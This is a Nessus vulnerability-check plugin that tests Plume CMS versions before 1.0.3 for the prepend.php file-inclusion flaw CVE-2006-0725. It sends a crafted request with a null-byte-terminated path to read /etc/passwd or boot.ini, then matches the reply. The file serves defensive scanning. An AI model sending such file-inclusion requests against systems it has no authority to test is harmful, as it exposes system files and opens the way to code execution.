#
# Script Written By Ferdy Riphagen 
# <f[dot]riphagen[at]nsec[dot]nl>
#
# Script distributed under the GNU GPLv2 License.
#

# Changes by Tenable:
# - Revised plugin title (3/31/2009)


include("compat.inc");

if (description) {
 script_id(20972);
 script_version("$Revision: 1.19 $");
 script_cvs_date("$Date: 2017/04/25 14:31:38 $");

 script_cve_id("CVE-2006-0725");
 script_bugtraq_id(16662);
 script_osvdb_id(23204);

 script_name(english:"Plume CMS < 1.0.3 Remote File Inclusion");
 script_summary(english:"Check if Plume CMS is vulnerable to a file inclusion flaw");

 script_set_attribute(attribute:"synopsis", value:
"The remote host is running a PHP application that is prone
to local and remote file inclusion attacks.");
 script_set_attribute(attribute:"description", value:
"The system is running Plume CMS a simple but powerful 
content management system.

The version installed does not sanitize user input in the
'_PX_config[manager_path]' parameter in the 'prepend.php' file.
This allows an attacker to include arbitrary files and execute code
on the system.

This flaw is exploitable if PHP's register_globals is enabled.");
 # https://web.archive.org/web/20060426074003/http://www.plume-cms.net/news/77-Security-Notice-Please-Update-Your-Prependphp-File
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?e9e65567");
 script_set_attribute(attribute:"see_also", value:"http://secunia.com/advisories/18883/");
 script_set_attribute(attribute:"solution", value:
"Either sanitize the prepend.php file as advised by the developer 
(see first URL) or upgrade to Plume CMS version 1.0.3 or later.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:W/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value:"2006/02/23");
 script_set_attribute(attribute:"vuln_publication_date", value:"2006/02/15");

 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"cpe", value:"cpe:/a:plume-cms:plume_cms");
 script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

 script_category(ACT_ATTACK);
 script_family(english:"CGI abuses");
 script_copyright(english:"This script is Copyright (C) 2006-2017 Ferdy Riphagen");

 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_keys("www/PHP");
 exit(0);
}

include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

port = get_http_port(default:80);
if (get_kb_item("Services/www/"+port+"/embedded")) exit(0);
if (!can_host_php(port:port)) exit(0);

# Check a few directories.
if (thorough_tests) dirs = list_uniq(make_list("/plume", "/cms", "/", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
 res = http_get_cache(item:string(dir, "/index.php"), port:port);
 if(res == NULL) exit(0);

 if('"powered by PLUME CMS' >< res && egrep(pattern:'<a href=[^>]+.*alt="powered by PLUME CMS', string:res)) {

  # Try to grab a local file.
  file[0] = "/etc/passwd";
  file[1] = "c:/boot.ini";

  for(test = 0; file[test]; test++) {
   req = http_get(item:string(dir, "/prepend.php?_PX_config[manager_path]=", file[test], "%00"), port:port); 
   #debug_print("req: ", req, "\n");

   recv = http_keepalive_send_recv(data:req, bodyonly:TRUE, port:port);
   if (!recv) exit(0);
   #debug_print("recv: ", recv, "\n");

   if (egrep(pattern:"root:.*:0:[01]:.*:", string:recv) ||
       egrep(pattern:"default=multi.*disk.*partition", string:recv) ||
       # And if magic_quotes_gpc = on, check for error messages.
       egrep(pattern:"Warning.+\([^>]+\\0/conf/config\.php.+failed to open stream", string:recv)) {
    security_hole(port);
    exit(0);
   }
   if (!thorough_tests) break;  
  }
 }
}
